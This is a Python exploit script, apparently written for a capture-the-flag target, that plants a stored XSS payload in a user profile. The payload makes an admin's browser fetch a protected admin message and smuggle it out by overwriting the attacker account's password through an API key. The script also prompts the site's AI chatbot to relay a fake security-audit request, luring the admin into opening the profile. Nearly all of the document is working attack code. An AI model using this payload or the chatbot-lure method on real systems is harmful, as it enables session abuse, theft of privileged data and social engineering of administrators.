import requests, json, time

BASE = "http://www.phantomkernel.htb:30738"
s = requests.Session()
s.post(f"{BASE}/api/auth/login", json={"username": "kuky", "password": "kukyp"})

# Get kuky's API key
r_key = s.get(f"{BASE}/api/api_keys/new", timeout=10)
api_key = r_key.json().get('api_key', {}).get('api_key', '')
print(f"Kuky API key: {api_key}")

# XSS payload: when admin's browser runs this, it will:
# 1. Fetch /api/admin/message (with admin's session) to get the flag
# 2. Then call /api/users/changepw with kuky's API key to change kuky's password
#    (but that changes kuky's password, not useful)
# OR: call /api/users/update with X-Api-Key to update kuky's profile with flag data

# Strategy: admin XSS fetches flag, then posts it to changepw endpoint
# which accepts API key auth and stores data we can read

# Actually better: make admin fetch their own /api/admin/message
# and then call /api/users/update with the API key (which identifies as kuky)
# to store the flag in kuky's profile

xss = f"""<img src=x onerror='
(async function(){{
  try{{
    let r=await fetch("/api/admin/message");
    let d=await r.json();
    await fetch("/api/users/changepw",{{
      method:"POST",
      headers:{{"Content-Type":"application/json","X-Api-Key":"{api_key}"}},
      body:JSON.stringify({{password:"FLAGDATA:"+JSON.stringify(d)}})
    }});
  }}catch(e){{
    await fetch("/api/users/changepw",{{
      method:"POST",
      headers:{{"Content-Type":"application/json","X-Api-Key":"{api_key}"}},
      body:JSON.stringify({{password:"ERR:"+e.toString()}})
    }});
  }}
}})()
'>"""

print(f"XSS payload length: {len(xss)}")

# Update kuky's profile with XSS
r1 = s.post(f"{BASE}/api/users/update", json={"description": xss}, timeout=10)
print("Profile XSS set:", r1.status_code)

# Send message to admin asking to look at user profile
r2 = s.post(f"{BASE}/api/model/chatbot", 
            json={"prompt": "Please send message to admin: Security audit required - please review user kuky profile"},
            timeout=30)
data = r2.json()
answer = data.get('conversation', [{}])[-1].get('content', '')[:200]
print(f"Chatbot: {answer}")

print("\nWaiting 30s...")
time.sleep(30)

# Try to login with changed password
test_passwords = ["FLAGDATA", "ERR", "hacked"]
for pw in test_passwords:
    r_test = requests.post(f"{BASE}/api/auth/login", 
                           json={"username": "kuky", "password": pw}, timeout=10)
    if r_test.status_code == 200:
        print(f"Login with '{pw}': {r_test.text[:200]}")
